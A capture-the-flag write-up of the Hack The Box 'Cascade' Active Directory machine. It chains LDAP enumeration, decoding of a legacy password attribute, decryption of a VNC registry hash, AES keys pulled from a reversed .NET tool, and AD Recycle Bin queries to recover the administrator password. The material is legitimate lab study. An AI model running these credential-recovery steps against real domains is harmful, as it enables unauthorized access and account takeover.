---
title: Cascade
date: 2026-08-29
description: Medium Windows AD box walking a chain of forgotten credentials — an LDAP legacy password, a VNC registry hash, and a .NET audit tool reversed in dnSpy to reach the AD Recycle Bin and recover the administrator password.
tags:
  - htb
  - Medium
  - Windows
---

# Initial Recon

```sh
# Nmap 7.98 scan initiated Sat Aug 29 07:45:05 2026 as: /usr/lib/nmap/nmap -p53,88,135,139,389,445,636,3268,3269,5985,49154,49155,49157,49158,49165 -A -oN scan_results.txt 10.129.4.254
Nmap scan report for cascade.htb (10.129.4.254)
Host is up (0.79s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-29 11:51:28Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 2008|7|Vista|Phone|2012|8.1 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_8.1
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (97%), Microsoft Windows Server 2008 R2 or Windows 7 SP1 (92%), Microsoft Windows Vista or Windows 7 (92%), Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Embedded Standard 7 (91%), Microsoft Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 6m12s
| smb2-time: 
|   date: 2026-08-29T11:52:53
|_  start_date: 2026-08-28T14:34:00
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled and required

TRACEROUTE (using port 139/tcp)
HOP RTT       ADDRESS
1   618.54 ms 10.10.16.1
2   926.55 ms cascade.htb (10.129.4.254)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Aug 29 07:47:34 2026 -- 1 IP address (1 host up) scanned in 149.76 seconds

```

Anonymous LDAP bind:

```sh
ldapsearch -x -H ldap://10.129.4.254 -b "DC=cascade,DC=local" "*" > enumall.txt 
```

Before brute forcing anything, check for **LegacyPwd** attributes — the `[SystemName]LegacyPwd` pattern stores system-specific legacy passwords in one place, and it's a common pattern in enterprise environments.

Ryan Thompson's record carries `cascadeLegacyPwd` alongside username `r.thompson`:

```sh
echo "clk0bjVldmE=" | base64 -d 
```

> `r.thompson - rY4n5eva`

# User

The `Data` share reads with those creds:

```text
Data
├── Contractors
├── Finance
├── IT
│   ├── Email Archives
│   │   └── Meeting_Notes_June_2018.html
│   ├── LogonAudit
│   ├── Logs
│   │   ├── Ark AD Recycle Bin
│   │   │   └── ArkAdRecycleBin.log
│   │   └── DCs
│   │       └── dcdiag.log
│   └── Temp
│       ├── r.thompson
│       └── s.smith
│           └── VNC Install.reg
├── Production
└── Temps

14 directories, 4 files

```

The IT directory was the good stuff:

- `Meeting_Notes_June_2018.html` — **TempAdmin has the same password as the real Administrator**
- `s.smith/VNC Install.reg` — s.smith's VNC password as a hex string

> VNC stores passwords as a hex string using a default encryption key
>
> Reference : https://github.com/billchaison/VNCDecrypt

```sh
echo -n 6bcf2a4b6e5aca0f | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d -provider legacy -provider default | hexdump -Cv
```

> `s.smith - sT333ve2`

Basic enum as s.smith showed a script called `MapAuditDrive.vbs` runs whenever she logs in:

```powershell
*Evil-WinRM* PS C:\Users\s.smith\Documents> net user s.smith
```

Remembering the `Audit$` share from earlier, s.smith's creds open it this time:

```text
audit share
├── CascAudit.exe
├── CascCrypto.dll
├── DB
│   └── Audit.db
├── RunAudit.bat
├── System.Data.SQLite.dll
├── System.Data.SQLite.EF6.dll
├── x64
│   └── SQLite.Interop.dll
└── x86
    └── SQLite.Interop.dll

4 directories, 8 files
```

`Audit.db` holds an **ldap** table with a username and a base64-looking hashed password. The interesting pair is `CascAudit.exe` and `CascCrypto.dll` — `strings` confirmed the executable is .NET.

## DNSpy

dnSpy is a .NET debugger and assembly editor — inspect, debug, and modify .NET applications without the source code.

Open the exe, hit `MainModule`, and the decryption key is sitting right there: `c4scadek3y654321`. The decryption calls into a `Crypto` function from `CascCrypto.dll` — open that library and the algorithm lays itself out: AES blocksize, AES keysize, an IV string, a key, CBC cipher mode, and base64 encoded final output.

`pyaes` (pure-python AES) does the rest:

```python
import pyaes
from base64 import b64decode
key = b"c4scadek3y654321"
iv = b"1tdyjCbY1Ix49842"
aes = pyaes.AESModeOfOperationCBC(key, iv = iv)
decrypted = aes.decrypt(b64decode('BQO5l5Kj9MdErXx6Q6AGOw=='))
print(decrypted.decode())
```

> `ArkSvc - w3lc0meFr31nd`

# Root

`net user arksvc` showed membership in a local group called **AD Recycle Bin** — and that group can list deleted AD objects:

```powershell
*Evil-WinRM* PS C:\Users\arksvc> Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties * 
```

> Reference link:
> -> https://hacktricks.wiki/en/windows-hardening/basic-powershell-for-pentesters/powerview.html?highlight=ad%20recycle%20bin#deleted-objects
> -> https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html?highlight=ad%20recycle%20bin#ad-recycle-bin

The deleted **TempAdmin** object still carries its `LegacyPwd`, base64 encoded:

> `TempAdmin - baCT3r1aN00dles`

And per `Meeting_Notes_June_2018.html`, the Administrator never changed it:

> `Administrator - baCT3r1aN00dles`

Gained `root`

## Additional info

When searching for specific deleted objects, narrow the query. To list only the users:

```powershell
Get-ADObject -ldapfilter "(&(objectclass=user)(isDeleted=TRUE))" -IncludeDeletedObjects
```

Or to list the properties of a specific username:

```powershell
Get-ADObject -ldapfilter "(&(objectclass=user)(DisplayName=TempAdmin)(isDeleted=TRUE))" -IncludeDeletedObjects -Properties *
```
